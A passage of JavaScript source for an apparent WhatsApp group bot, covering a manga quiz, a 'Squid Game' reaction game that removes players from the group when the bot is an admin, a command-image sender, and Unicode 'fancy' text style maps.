      text: `${prefix ? prefix + '\n\n' : ''}🏁 *FIN DU QUIZ MANGA!*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n📊 *Final ranking:*\n${formatQuizScores(scores)}\n\n${winner ? `🏆 Winner: @${winner[0].split('@')[0]} with ${winner[1]} point(s)!` : 'No winner!'}`,
      mentions: winner ? [winner[0]] : []
    });
    return;
  }

  state.data.index    = nextIndex;
  state.data.current  = questions[nextIndex];
  state.data.hintUsed = false;

  await sock.sendMessage(remoteJid, {
    text: `${prefix ? prefix + '\n\n' : ''}❓ *Question ${nextIndex+1}/${total}:*\n${questions[nextIndex].q}\n\n_💡 Type_ ${config.prefix}hint _for a hint_`
  });

  setTimeout(() => advanceQuizQuestion(sock, remoteJid, '⏰ Times up!'), 30000);
}

async function processQuizAnswer(sock, message, text, remoteJid, senderJid, state) {
  const { current, hintUsed, scores } = state.data;
  const prefix = config.prefix;

  // Indice
  if (text.toLowerCase() === `${prefix}hint` || text.toLowerCase() === prefix + 'hint') {
    if (!hintUsed) {
      state.data.hintUsed = true;
      await sock.sendMessage(remoteJid, { text: `💡 *Hint:* ${current.hint}` });
    }
    return;
  }

  // Vérifier réponse
  if (text.toLowerCase().trim() === current.a.toLowerCase()) {
    scores[senderJid] = (scores[senderJid] || 0) + (hintUsed ? 0.5 : 1);
    const pts = scores[senderJid];
    await sock.sendMessage(remoteJid, {
      text: `✅ *CORRECT ANSWER!*\n🎉 @${senderJid.split('@')[0]} → +${hintUsed?'0.5':'1'} pt (Total: ${pts})\n\n📖 Answer: *${current.a}*`,
      mentions: [senderJid]
    });
    await advanceQuizQuestion(sock, remoteJid);
  }
}

// =============================================
// 🦑 SQUID GAME
// =============================================
const SQUID_ROUNDS = [
  { name: '🔴 Feu Rouge / 🟢 Feu Vert', instruction: '🟢 = *AVANCER*  |  🔴 = *RESTER IMMOBILE*\n\nRéagissez with 🟢 pour avancer et survivre!', target: '🟢', wrong: '🔴', duration: 25000 },
  { name: '🍬 Dalgona Challenge', instruction: '🟢 = *DÉCOUPER AVEC SOIN*  |  🔴 = *TROP RAPIDE (éliminé)*\n\nRéagissez with 🟢 pour réussir!', target: '🟢', wrong: '🔴', duration: 20000 },
  { name: '🪆 Marbles Game', instruction: '🟢 = *JOUER*  |  🔴 = *ABANDONNER*\n\nRéagissez with 🟢 pour continuer!', target: '🟢', wrong: '🔴', duration: 30000 },
  { name: '🌉 Glass Bridge', instruction: '🟢 = *VERRE SOLIDE*  |  🔴 = *VERRE FRAGILE (mort)*\n\nRéagissez with 🟢 pour traverser!', target: '🟢', wrong: '🔴', duration: 15000 },
  { name: '🗡️ Round Final - Squid Game', instruction: '🟢 = *ATTAQUER*  |  🔴 = *DÉFENDRE*\n\nRéagissez with 🟢 pour gagner le round final!', target: '🟢', wrong: '🔴', duration: 20000 },
];

async function handleSquidGame(sock, args, message, remoteJid, senderJid, isGroup) {
  if (!isGroup) {
    await sock.sendMessage(remoteJid, { text: '❌ Squid Game → groups only!' });
    return;
  }

  const existing = gameState.get(remoteJid);
  if (existing?.type === 'squidgame') {
    if (args[0] === 'stop') {
      gameState.delete(remoteJid);
      await sock.sendMessage(remoteJid, { text: '🛑 Squid Game arrêté par l\'admin.' });
      return;
    }
    await sock.sendMessage(remoteJid, { text: `⚠️ A Squid Game is already in progress!\n_${config.prefix}squidgame stop → stop_` });
    return;
  }

  // Récupérer tous les participants du groupe
  let participants = [];
  try {
    const meta = await sock.groupMetadata(remoteJid);
    participants = meta.participants.map(p => p.id).filter(id => id !== sock.user?.id && id !== senderJid);
  } catch(e) {
    await sock.sendMessage(remoteJid, { text: '❌ Unable to fetch group members.' });
    return;
  }

  if (participants.length < 4) {
    await sock.sendMessage(remoteJid, { text: '❌ At least 4 members needed to play!' });
    return;
  }

  // Init état
  gameState.set(remoteJid, {
    type: 'squidgame',
    data: {
      players: new Set(participants),     // players still alive
      eliminated: new Set(),              // eliminated
      roundIndex: 0,
      reactions: new Map(),               // senderJid → emoji
      roundActive: false,
      host: senderJid,
      startTime: Date.now()
    }
  });

  const mentions = participants.slice(0, 20); // max 20 mentions
  await sock.sendMessage(remoteJid, {
    text: `🦑 *SQUID GAME COMMENCE!*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `👥 *${participants.length} participant(s)* enregistrés!\n` +
      `🎯 Survive all rounds to win!\n\n` +
      `📋 *Règles:*\n` +
      `• Réagissez with le bon emoji quand demandé\n` +
      `• 🟢 = Good action | 🔴 = Wrong action\n` +
      `• Si 3 rounds without reaction → 10 players kicked\n` +
      `• 4 good reactions = round protection\n\n` +
      `⏳ *Round 1 starts in 5 seconds...*\n\n` +
      `${participants.slice(0,20).map(p => `@${p.split('@')[0]}`).join(' ')}`,
    mentions
  });

  setTimeout(() => startSquidRound(sock, remoteJid), 5000);
}

async function startSquidRound(sock, remoteJid) {
  const state = gameState.get(remoteJid);
  if (!state || state.type !== 'squidgame') return;

  const { roundIndex, players, eliminated } = state.data;

  if (roundIndex >= SQUID_ROUNDS.length || players.size === 0) {
    await endSquidGame(sock, remoteJid, state);
    return;
  }

  const round = SQUID_ROUNDS[roundIndex];
  state.data.reactions  = new Map();
  state.data.roundActive = true;

  const alive = [...players];
  const mentions = alive.slice(0, 20);

  await sock.sendMessage(remoteJid, {
    text: `🦑 *ROUND ${roundIndex + 1}: ${round.name}*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `${round.instruction}\n\n` +
      `👥 Players remaining: *${players.size}*\n` +
      `⏱️ You have *${round.duration / 1000} seconds!*\n\n` +
      `${alive.slice(0,20).map(p => `@${p.split('@')[0]}`).join(' ')}`,
    mentions
  });

  // Timer de fin de round
  setTimeout(() => endSquidRound(sock, remoteJid, round), round.duration);
}

async function processSquidReaction(sock, message, text, remoteJid, senderJid, state) {
  const { roundActive, players, reactions } = state.data;
  if (!roundActive) return;
  if (!players.has(senderJid)) return; // Déjà éliminé

  const emoji = text.trim();
  if (emoji === '🟢' || emoji === '🔴') {
    reactions.set(senderJid, emoji);
  }
}

async function endSquidRound(sock, remoteJid, round) {
  const state = gameState.get(remoteJid);
  if (!state || state.type !== 'squidgame') return;

  state.data.roundActive = false;
  const { players, reactions, eliminated, roundIndex } = state.data;

  const goodReactions  = [...reactions.entries()].filter(([,e]) => e === round.target).map(([j]) => j);
  const wrongReactions = [...reactions.entries()].filter(([,e]) => e === round.wrong).map(([j]) => j);
  const noReaction     = [...players].filter(j => !reactions.has(j));

  // Éliminer ceux qui ont réagi with le mauvais emoji
  wrongReactions.forEach(j => { players.delete(j); eliminated.add(j); });

  let resultText = `📊 *RÉSULTAT ROUND ${roundIndex + 1}*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  resultText += `✅ Good reactions: *${goodReactions.length}*\n`;
  resultText += `❌ Wrong reactions: *${wrongReactions.length}*\n`;
  resultText += `😶 No reaction: *${noReaction.length}*\n\n`;

  // Règle: si 0 bonne réaction sur 3 rounds consécutifs → expulser 10
  state.data.noReactionStreak = (state.data.noReactionStreak || 0);
  if (goodReactions.length === 0) {
    state.data.noReactionStreak++;
    if (state.data.noReactionStreak >= 3) {
      // Expulser 10 joueurs aléatoires
      const toKick = [...players].sort(() => Math.random() - 0.5).slice(0, Math.min(10, players.size));
      toKick.forEach(j => { players.delete(j); eliminated.add(j); });
      resultText += `☠️ *3 rounds without reaction! 10 players kicked!*\n`;
      resultText += toKick.map(j => `• @${j.split('@')[0]}`).join('\n') + '\n\n';
      state.data.noReactionStreak = 0;

      try {
        const botIsAdmin = await isBotGroupAdmin(sock, remoteJid);
        if (botIsAdmin) {
          for (const jid of toKick) {
            await sock.groupParticipantsUpdate(remoteJid, [jid], 'remove').catch(() => {});
            await delay(500);
          }
        }
      } catch(e) {}
    }
  } else if (goodReactions.length >= 4) {
    // Protection: les 4+ premiers protégés ce round
    state.data.noReactionStreak = 0;
    resultText += `🛡️ *${goodReactions.length} joueurs ont réagi correctement → protégés ce round!*\n\n`;
  } else {
    state.data.noReactionStreak = 0;
  }

  // Expulser les mauvaises réactions du groupe
  if (wrongReactions.length > 0) {
    try {
      const botIsAdmin = await isBotGroupAdmin(sock, remoteJid);
      if (botIsAdmin) {
        for (const jid of wrongReactions) {
          await sock.groupParticipantsUpdate(remoteJid, [jid], 'remove').catch(() => {});
          await delay(500);
        }
      }
    } catch(e) {}
    resultText += `🚪 *Eliminated:*\n${wrongReactions.map(j => `• @${j.split('@')[0]}`).join('\n')}\n\n`;
  }

  resultText += `👥 *Survivors: ${players.size}*\n`;

  const allMentions = [...goodReactions, ...wrongReactions, ...noReaction].slice(0, 20);
  await sock.sendMessage(remoteJid, { text: resultText, mentions: allMentions });

  state.data.roundIndex++;

  if (players.size <= 1) {
    await endSquidGame(sock, remoteJid, state);
    return;
  }

  await delay(4000);
  await startSquidRound(sock, remoteJid);
}

async function endSquidGame(sock, remoteJid, state) {
  gameState.delete(remoteJid);
  const { players, eliminated } = state.data;

  const winners = [...players];
  const winMentions = winners.slice(0, 10);

  await sock.sendMessage(remoteJid, {
    text: `🦑 *SQUID GAME TERMINÉ!*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `${winners.length > 0
        ? `🏆 *${winners.length} GAGNANT(S):*\n${winners.map(j => `👑 @${j.split('@')[0]}`).join('\n')}`
        : '☠️ *Tous les joueurs ont été eliminated!*'
      }\n\n` +
      `📊 Eliminated: ${eliminated.size}\n` +
      `🎮 Rounds joués: ${state.data.roundIndex}\n\n` +
      `_Thanks for playing Squid Game!_ 🦑`,
    mentions: winMentions
  });
}

// =============================================
// 🖼️ SYSTÈME D'IMAGES PAR COMMANDE
// =============================================
// Place une image dans le dossier du bot nommée:
//   ping.jpg, alive.jpg, info.jpg, sticker.jpg...
// Le bot l'enverra automatiquement en caption!
// Formats supportés: .jpg .jpeg .png .gif .webp
// =============================================

// =============================================
// 🔧 BUILD META QUOTE — Crée un message cité stylé
// =============================================
function buildMetaQuote(latencyMs = null) {
  return null;
}

async function sendWithImage(sock, remoteJid, cmdName, text, mentions = [], latencyMs = null) {
  const videoExts = ['.mp4','.mov','.mkv'], imageExts = ['.jpg','.jpeg','.png','.gif','.webp'];
  let mediaPath = null, mediaType = null;
  for (const ext of videoExts) { const p=`./${cmdName}${ext}`; if(fs.existsSync(p)){mediaPath=p;mediaType='video';break;} }
  if (!mediaPath) { for (const ext of imageExts) { const p=`./${cmdName}${ext}`; if(fs.existsSync(p)){mediaPath=p;mediaType='image';break;} } }

  const sendOpts = {};
  let sentMsg;
  try {
    if (mediaPath && mediaType === 'video') {
      sentMsg = await sock.sendMessage(remoteJid, {
        video: fs.readFileSync(mediaPath),
        caption: text,
        gifPlayback: false,
        mentions,
      }, sendOpts);
    } else if (mediaPath && mediaType === 'image') {
      sentMsg = await sock.sendMessage(remoteJid, {
        image: fs.readFileSync(mediaPath),
        caption: text,
        mentions,
      }, sendOpts);
    } else {
      sentMsg = await sock.sendMessage(remoteJid, {
        text,
        mentions,
      }, sendOpts);
    }
  } catch(e) {
    try { sentMsg = await sock.sendMessage(remoteJid, { text, mentions }); } catch(e2) {}
  }

  sendCmdAudio(sock, remoteJid).catch(() => {});
  return sentMsg;
}

// =============================================
// ✨ COMMANDE FANCY — Convertir texte en styles
// Usage: !fancy [numéro] [texte]
//        !fancy [texte]  → liste tous les styles
// =============================================
async function handleFancy(sock, args, remoteJid, senderJid) {
  if (!args.length) {
    await sock.sendMessage(remoteJid, {
      text: `✨ *FANCY - Styles de texte*\n\nUsage:\n• ${config.prefix}fancy [texte] → voir tous les styles\n• ${config.prefix}fancy [numéro] [texte] → style spécifique\n\nEx: ${config.prefix}fancy SEIGNEUR TD\nEx: ${config.prefix}fancy 10 SEIGNEUR TD`
    });
    return;
  }

  // Détecter si le premier arg est un numéro
  const firstArg = args[0];
  let styleNum = parseInt(firstArg);
  let text;

  if (!isNaN(styleNum) && args.length > 1) {
    text = args.slice(1).join(' ');
  } else {
    styleNum = null;
    text = args.join(' ');
  }

  // Table de conversion lettre → fancy par style
  // Chaque style a un mapping complet A-Z a-z 0-9
  function applyStyle(text, styleIndex) {
    const styles = [
      // 1 - ຊ໐k໐น style Thai/Lao
      { map: {'a':'ส','b':'ც','c':'ċ','d':'ɗ','e':'ε','f':'ƒ','g':'ɠ','h':'ɦ','i':'ı','j':'ʝ','k':'ƙ','l':'ʟ','m':'๓','n':'ŋ','o':'໐','p':'ρ','q':'զ','r':'ɾ','s':'ʂ','t':'ƭ','u':'น','v':'ν','w':'ω','x':'χ','y':'ყ','z':'ʑ','A':'ส','B':'ც','C':'Ċ','D':'Ɗ','E':'Ε','F':'Ƒ','G':'Ɠ','H':'Ɦ','I':'I','J':'ʝ','K':'Ƙ','L':'Ⴊ','M':'๓','N':'Ŋ','O':'໐','P':'Ρ','Q':'Զ','R':'ɾ','S':'Ʂ','T':'Ƭ','U':'น','V':'Ν','W':'Ω','X':'Χ','Y':'Ყ','Z':'ʑ'} },
      // 2 - ʑơƙơų style
      { map: {'a':'ą','b':'ɓ','c':'ƈ','d':'ɗ','e':'ɛ','f':'ʄ','g':'ɠ','h':'ɦ','i':'ı','j':'ʝ','k':'ƙ','l':'ʟ','m':'ɱ','n':'ŋ','o':'ơ','p':'ρ','q':'զ','r':'ɾ','s':'ʂ','t':'ƭ','u':'ų','v':'ν','w':'ω','x':'χ','y':'ყ','z':'ʑ','A':'Ą','B':'Ɓ','C':'Ƈ','D':'Ɗ','E':'Ɛ','F':'ʄ','G':'Ɠ','H':'Ɦ','I':'ı','J':'ʝ','K':'Ƙ','L':'ʟ','M':'ɱ','N':'Ŋ','O':'Ơ','P':'Ρ','Q':'Զ','R':'ɾ','S':'Ʂ','T':'Ƭ','U':'Ų','V':'Ν','W':'Ω','X':'Χ','Y':'Ყ','Z':'ʑ'} },
      // 3 - 乙のズのひ Japanese
      { map: {'a':'ά','b':'乃','c':'ς','d':'∂','e':'ε','f':'ƒ','g':'g','h':'ん','i':'ι','j':'j','k':'ズ','l':'ℓ','m':'ﾶ','n':'η','o':'の','p':'ρ','q':'q','r':'尺','s':'丂','t':'τ','u':'ひ','v':'ν','w':'ω','x':'χ','y':'ソ','z':'乙','A':'ά','B':'乃','C':'ς','D':'∂','E':'Ε','F':'Ƒ','G':'G','H':'ん','I':'ι','J':'J','K':'ズ','L':'ℓ','M':'ﾶ','N':'η','O':'の','P':'Ρ','Q':'Q','R':'尺','S':'丂','T':'τ','U':'ひ','V':'Ν','W':'Ω','X':'Χ','Y':'ソ','Z':'乙'} },
      // 4 - 乙ㄖҜㄖㄩ Leet/Kanji
      { map: {'a':'ᗩ','b':'ᗷ','c':'ᑕ','d':'ᗪ','e':'ᗴ','f':'ᖴ','g':'Ǥ','h':'ᕼ','i':'ι','j':'ᒍ','k':'Ҝ','l':'ᒪ','m':'ᗰ','n':'ᑎ','o':'ㄖ','p':'ᑭ','q':'Ƣ','r':'ᖇ','s':'Ş','t':'ƬΉΣ','u':'ᑌ','v':'᙮᙮','w':'ᗯ','x':'᙭','y':'ƳΘᑌ','z':'乙','A':'ᗩ','B':'ᗷ','C':'ᑕ','D':'ᗪ','E':'ᗴ','F':'ᖴ','G':'Ǥ','H':'ᕼ','I':'ι','J':'ᒍ','K':'Ҝ','L':'ᒪ','M':'ᗰ','N':'ᑎ','O':'ㄖ','P':'ᑭ','Q':'Ƣ','R':'ᖇ','S':'Ş','T':'Ƭ','U':'ᑌ','V':'᙮᙮','W':'ᗯ','X':'᙭','Y':'Ƴ','Z':'乙'} },
      // 5 - 🅉🄾🄺🄾🅄 Enclosed letters
      { map: {'a':'🄰','b':'🄱','c':'🄲','d':'🄳','e':'🄴','f':'🄵','g':'🄶','h':'🄷','i':'🄸','j':'🄹','k':'🄺','l':'🄻','m':'🄼','n':'🄽','o':'🄾','p':'🄿','q':'🅀','r':'🅁','s':'🅂','t':'🅃','u':'🅄','v':'🅅','w':'🅆','x':'🅇','y':'🅈','z':'🅉','A':'🄰','B':'🄱','C':'🄲','D':'🄳','E':'🄴','F':'🄵','G':'🄶','H':'🄷','I':'🄸','J':'🄹','K':'🄺','L':'🄻','M':'🄼','N':'🄽','O':'🄾','P':'🄿','Q':'🅀','R':'🅁','S':'🅂','T':'🅃','U':'🅄','V':'🅅','W':'🅆','X':'🅇','Y':'🅈','Z':'🅉'} },
      // 6 - ፚᎧᏦᎧᏬ Ethiopian/Cherokee
      { map: {'a':'Ꭺ','b':'Ᏸ','c':'Ꮯ','d':'Ꭰ','e':'Ꮛ','f':'Ꭶ','g':'Ꮆ','h':'Ꮒ','i':'Ꭵ','j':'Ꮰ','k':'Ꮶ','l':'Ꮮ','m':'Ꮇ','n':'Ꮑ','o':'Ꭷ','p':'Ꭾ','q':'Ꭴ','r':'Ꮢ','s':'Ꮥ','t':'Ꮦ','u':'Ꮜ','v':'Ꮩ','w':'Ꮃ','x':'Ꮙ','y':'Ꮍ','z':'ፚ','A':'Ꭺ','B':'Ᏸ','C':'Ꮯ','D':'Ꭰ','E':'Ꮛ','F':'Ꭶ','G':'Ꮆ','H':'Ꮒ','I':'Ꭵ','J':'Ꮰ','K':'Ꮶ','L':'Ꮮ','M':'Ꮇ','N':'Ꮑ','O':'Ꭷ','P':'Ꭾ','Q':'Ꭴ','R':'Ꮢ','S':'Ꮥ','T':'Ꮦ','U':'Ꮜ','V':'Ꮩ','W':'Ꮃ','X':'Ꮙ','Y':'Ꮍ','Z':'ፚ'} },
      // 7 - ᘔOKOᑌ Canadian Aboriginal
      { map: {'a':'ᗩ','b':'ᗷ','c':'ᑕ','d':'ᗪ','e':'ᕮ','f':'ᖴ','g':'ᘜ','h':'ᕼ','i':'ᓰ','j':'ᒍ','k':'ᛕ','l':'ᒪ','m':'ᗰ','n':'ᑎ','o':'O','p':'ᑭ','q':'ᕴ','r':'ᖇ','s':'ᔕ','t':'ᗪ','u':'ᑌ','v':'ᐯ','w':'ᗯ','x':'ᘔ','y':'ᖻ','z':'ᘔ','A':'ᗩ','B':'ᗷ','C':'ᑕ','D':'ᗪ','E':'ᕮ','F':'ᖴ','G':'ᘜ','H':'ᕼ','I':'ᓰ','J':'ᒍ','K':'ᛕ','L':'ᒪ','M':'ᗰ','N':'ᑎ','O':'O','P':'ᑭ','Q':'ᕴ','R':'ᖇ','S':'ᔕ','T':'ᗪ','U':'ᑌ','V':'ᐯ','W':'ᗯ','X':'ᘔ','Y':'ᖻ','Z':'ᘔ'} },
      // 8 - ʐօӄօʊ Armenian
      { map: {'a':'ą','b':'ҍ','c':'ç','d':'ժ','e':'ҽ','f':'ƒ','g':'ց','h':'հ','i':'ì','j':'ʝ','k':'ҟ','l':'Ӏ','m':'ʍ','n':'ղ','o':'օ','p':'ρ','q':'զ','r':'ɾ','s':'ʂ','t':'է','u':'մ','v':'ѵ','w':'ա','x':'×','y':'վ','z':'ʐ','A':'Ą','B':'Ҍ','C':'Ç','D':'Ժ','E':'Ҽ','F':'Ƒ','G':'Ց','H':'Հ','I':'Ì','J':'ʝ','K':'Ҟ','L':'Ӏ','M':'ʍ','N':'Ղ','O':'Օ','P':'Ρ','Q':'Զ','R':'ɾ','S':'Ʂ','T':'Է','U':'Մ','V':'Ѵ','W':'Ա','X':'×','Y':'Վ','Z':'ʐ'} },
      // 9 - 𝚉𝚘𝚔𝚘𝚞 Monospace
      { range: [0x1D670, 0x1D689, 0x1D670] }, // handled separately
      // 10 - 𝙕𝙤𝙠𝙤𝙪 Bold Italic
      { range: [0x1D468, 0x1D481, 0x1D468] },
      // 11 - 𝐙𝐨𝐤𝐨𝐮 Bold
      { range: [0x1D400, 0x1D419, 0x1D400] },
      // 12 - 𝗭𝗼𝗸𝗼𝘂 Bold Sans
      { range: [0x1D5D4, 0x1D5ED, 0x1D5D4] },
      // 13 - 𝘡𝘰𝘬𝘰𝘶 Italic Sans
      { range: [0x1D608, 0x1D621, 0x1D608] },
      // 14 - Zσƙσυ Greek-ish
      { map: {'a':'α','b':'в','c':'¢','d':'∂','e':'є','f':'ƒ','g':'g','h':'н','i':'ι','j':'נ','k':'ƙ','l':'ℓ','m':'м','n':'η','o':'σ','p':'ρ','q':'q','r':'я','s':'ѕ','t':'т','u':'υ','v':'ν','w':'ω','x':'χ','y':'γ','z':'з','A':'Α','B':'В','C':'¢','D':'∂','E':'Є','F':'Ƒ','G':'G','H':'Η','I':'Ι','J':'נ','K':'Ƙ','L':'ℓ','M':'М','N':'Η','O':'Ω','P':'Ρ','Q':'Q','R':'Я','S':'Ѕ','T':'Τ','U':'Υ','V':'Ν','W':'Ω','X':'Χ','Y':'Υ','Z':'Ζ'} },
      // 15 - ⱫØ₭ØɄ Currency
      { map: {'a':'₳','b':'฿','c':'₵','d':'Đ','e':'Ɇ','f':'₣','g':'₲','h':'Ħ','i':'ł','j':'J','k':'₭','l':'Ⱡ','m':'₥','n':'₦','o':'Ø','p':'₱','q':'Q','r':'Ɽ','s':'$','t':'₮','u':'Ʉ','v':'V','w':'₩','x':'Ӿ','y':'Ɏ','z':'Ⱬ','A':'₳','B':'฿','C':'₵','D':'Đ','E':'Ɇ','F':'₣','G':'₲','H':'Ħ','I':'ł','J':'J','K':'₭','L':'Ⱡ','M':'₥','N':'₦','O':'Ø','P':'₱','Q':'Q','R':'Ɽ','S':'$','T':'₮','U':'Ʉ','V':'V','W':'₩','X':'Ӿ','Y':'Ɏ','Z':'Ⱬ'} },
      // 16 - Zðkðµ
      { map: {'a':'å','b':'ƀ','c':'ċ','d':'ð','e':'ê','f':'ƒ','g':'ĝ','h':'ĥ','i':'î','j':'ĵ','k':'ķ','l':'ļ','m':'m','n':'ñ','o':'ð','p':'þ','q':'q','r':'ŗ','s':'ş','t':'ţ','u':'µ','v':'v','w':'ŵ','x':'x','y':'ÿ','z':'ƶ','A':'Å','B':'Ƀ','C':'Ċ','D':'Ð','E':'Ê','F':'Ƒ','G':'Ĝ','H':'Ĥ','I':'Î','J':'Ĵ','K':'Ķ','L':'Ļ','M':'M','N':'Ñ','O':'Ð','P':'Þ','Q':'Q','R':'Ŗ','S':'Ş','T':'Ţ','U':'Ü','V':'V','W':'Ŵ','X':'X','Y':'Ÿ','Z':'Ƶ'} },
      // 17 - zσкσυ Cyrillic Greek
      { map: {'a':'α','b':'в','c':'с','d':'∂','e':'є','f':'f','g':'g','h':'н','i':'і','j':'ʝ','k':'к','l':'l','m':'м','n':'η','o':'σ','p':'р','q':'q','r':'г','s':'ѕ','t':'т','u':'υ','v':'ν','w':'ш','x':'χ','y':'у','z':'z','A':'Α','B':'В','C':'С','D':'D','E':'Є','F':'F','G':'G','H':'Н','I':'І','J':'J','K':'К','L':'L','M':'М','N':'Η','O':'Ω','P':'Р','Q':'Q','R':'Г','S':'Ѕ','T':'Т','U':'Υ','V':'Ν','W':'Ш','X':'Χ','Y':'У','Z':'Z'} },
      // 18 - ɀօҟօմ Armenian mix
      { map: {'a':'ɑ','b':'ɓ','c':'ƈ','d':'ɖ','e':'ɘ','f':'ʄ','g':'ɠ','h':'ɦ','i':'ı','j':'ʝ','k':'ҟ','l':'ʟ','m':'ɱ','n':'ɳ','o':'ɔ','p':'ρ','q':'q','r':'ɹ','s':'ʂ','t':'ƭ','u':'ʋ','v':'ʌ','w':'ɯ','x':'χ','y':'ʎ','z':'ɀ','A':'Ą','B':'Ɓ','C':'Ƈ','D':'Ɖ','E':'Ɛ','F':'ʄ','G':'Ɠ','H':'Ɦ','I':'ı','J':'ʝ','K':'Ҟ','L':'ʟ','M':'Ɱ','N':'ɳ','O':'Ɔ','P':'Ρ','Q':'Q','R':'ɹ','S':'Ʂ','T':'Ƭ','U':'Ʋ','V':'Ʌ','W':'Ɯ','X':'Χ','Y':'ʎ','Z':'ɀ'} },
      // 19 - ZӨKӨЦ Cyrillic caps
      { map: {'a':'Δ','b':'Ъ','c':'С','d':'D','e':'Є','f':'F','g':'Ǵ','h':'Н','i':'І','j':'J','k':'К','l':'Ĺ','m':'М','n':'Й','o':'Θ','p':'Р','q':'Q','r':'Я','s':'Ş','t':'Т','u':'Ц','v':'V','w':'W','x':'Х','y':'Ч','z':'Z','A':'Δ','B':'Ъ','C':'С','D':'D','E':'Є','F':'F','G':'Ǵ','H':'Н','I':'І','J':'J','K':'К','L':'Ĺ','M':'М','N':'Й','O':'Θ','P':'Р','Q':'Q','R':'Я','S':'Ş','T':'Т','U':'Ц','V':'V','W':'W','X':'Х','Y':'Ч','Z':'Z'} },
      // 20 - Subscript
      { map: {'a':'ₐ','b':'b','c':'c','d':'d','e':'ₑ','f':'f','g':'g','h':'ₕ','i':'ᵢ','j':'ⱼ','k':'ₖ','l':'ₗ','m':'ₘ','n':'ₙ','o':'ₒ','p':'ₚ','q':'q','r':'ᵣ','s':'ₛ','t':'ₜ','u':'ᵤ','v':'ᵥ','w':'w','x':'ₓ','y':'y','z':'z','A':'ₐ','B':'B','C':'C','D':'D','E':'ₑ','F':'F','G':'G','H':'ₕ','I':'ᵢ','J':'ⱼ','K':'ₖ','L':'ₗ','M':'ₘ','N':'ₙ','O':'ₒ','P':'ₚ','Q':'Q','R':'ᵣ','S':'ₛ','T':'ₜ','U':'ᵤ','V':'ᵥ','W':'W','X':'ₓ','Y':'Y','Z':'Z','0':'₀','1':'₁','2':'₂','3':'₃','4':'₄','5':'₅','6':'₆','7':'₇','8':'₈','9':'₉'} },
      // 21 - Superscript
      { map: {'a':'ᵃ','b':'ᵇ','c':'ᶜ','d':'ᵈ','e':'ᵉ','f':'ᶠ','g':'ᵍ','h':'ʰ','i':'ⁱ','j':'ʲ','k':'ᵏ','l':'ˡ','m':'ᵐ','n':'ⁿ','o':'ᵒ','p':'ᵖ','q':'q','r':'ʳ','s':'ˢ','t':'ᵗ','u':'ᵘ','v':'ᵛ','w':'ʷ','x':'ˣ','y':'ʸ','z':'ᶻ','A':'ᴬ','B':'ᴮ','C':'ᶜ','D':'ᴰ','E':'ᴱ','F':'ᶠ','G':'ᴳ','H':'ᴴ','I':'ᴵ','J':'ᴶ','K':'ᴷ','L':'ᴸ','M':'ᴹ','N':'ᴺ','O':'ᴼ','P':'ᴾ','Q':'Q','R':'ᴿ','S':'ˢ','T':'ᵀ','U':'ᵁ','V':'ᵛ','W':'ᵂ','X':'ˣ','Y':'ʸ','Z':'ᶻ','0':'⁰','1':'¹','2':'²','3':'³','4':'⁴','5':'⁵','6':'⁶','7':'⁷','8':'⁸','9':'⁹'} },
      // 22 - Thai style
      { map: {'a':'ค','b':'๖','c':'ς','d':'๔','e':'є','f':'f','g':'ﻮ','h':'h','i':'ﺎ','j':'ﻝ','k':'k','l':'l','m':'๓','n':'ห','o':'๏','p':'p','q':'q','r':'r','s':'ร','t':'t','u':'ย','v':'ν','w':'ω','x':'x','y':'ч','z':'z','A':'ค','B':'๖','C':'ς','D':'๔','E':'є','F':'F','G':'ﻮ','H':'H','I':'ﺎ','J':'ﻝ','K':'K','L':'L','M':'๓','N':'ห','O':'๏','P':'P','Q':'Q','R':'R','S':'ร','T':'T','U':'ย','V':'Ν','W':'Ω','X':'X','Y':'Ч','Z':'Z'} },
      // 23 - Double struck 𝕫𝕠𝕜𝕠𝕦
      { range: [0x1D538, 0x1D551, 0x1D538] },
      // 24 - Fraktur 𝖅𝖔𝖐𝖔𝖚
      { range: [0x1D504, 0x1D51D, 0x1D504] },
      // 25 - Negative squared 🆉🅾🅺🅾🆄
      { map: {'a':'🅰','b':'🅱','c':'🅲','d':'🅳','e':'🅴','f':'🅵','g':'🅶','h':'🅷','i':'🅸','j':'🅹','k':'🅺','l':'🅻','m':'🅼','n':'🅽','o':'🅾','p':'🅿','q':'🆀','r':'🆁','s':'🆂','t':'🆃','u':'🆄','v':'🆅','w':'🆆','x':'🆇','y':'🆈','z':'🆉','A':'🅰','B':'🅱','C':'🅲','D':'🅳','E':'🅴','F':'🅵','G':'🅶','H':'🅷','I':'🅸','J':'🅹','K':'🅺','L':'🅻','M':'🅼','N':'🅽','O':'🅾','P':'🅿','Q':'🆀','R':'🆁','S':'🆂','T':'🆃','U':'🆄','V':'🆅','W':'🆆','X':'🆇','Y':'🆈','Z':'🆉'} },
      // 26 - Script Bold 𝓩𝓸𝓴𝓸𝓾
      { range: [0x1D4D0, 0x1D4E9, 0x1D4D0] },
      // 27 - Fraktur 𝔷𝔬𝔨𝔬𝔲
      { range: [0x1D51E, 0x1D537, 0x1D51E] },
      // 28 - Fullwidth Ｚｏｋｏｕ
      { map: {'a':'ａ','b':'ｂ','c':'ｃ','d':'ｄ','e':'ｅ','f':'ｆ','g':'ｇ','h':'ｈ','i':'ｉ','j':'ｊ','k':'ｋ','l':'ｌ','m':'ｍ','n':'ｎ','o':'ｏ','p':'ｐ','q':'ｑ','r':'ｒ','s':'ｓ','t':'ｔ','u':'ｕ','v':'ｖ','w':'ｗ','x':'ｘ','y':'ｙ','z':'ｚ','A':'Ａ','B':'Ｂ','C':'Ｃ','D':'Ｄ','E':'Ｅ','F':'Ｆ','G':'Ｇ','H':'Ｈ','I':'Ｉ','J':'Ｊ','K':'Ｋ','L':'Ｌ','M':'Ｍ','N':'Ｎ','O':'Ｏ','P':'Ｐ','Q':'Ｑ','R':'Ｒ','S':'Ｓ','T':'Ｔ','U':'Ｕ','V':'Ｖ','W':'Ｗ','X':'Ｘ','Y':'Ｙ','Z':'Ｚ',' ':'　','0':'０','1':'１','2':'２','3':'３','4':'４','5':'５','6':'６','7':'７','8':'８','9':'９'} },
      // 29 - Small caps ᴢᴏᴋᴏᴜ
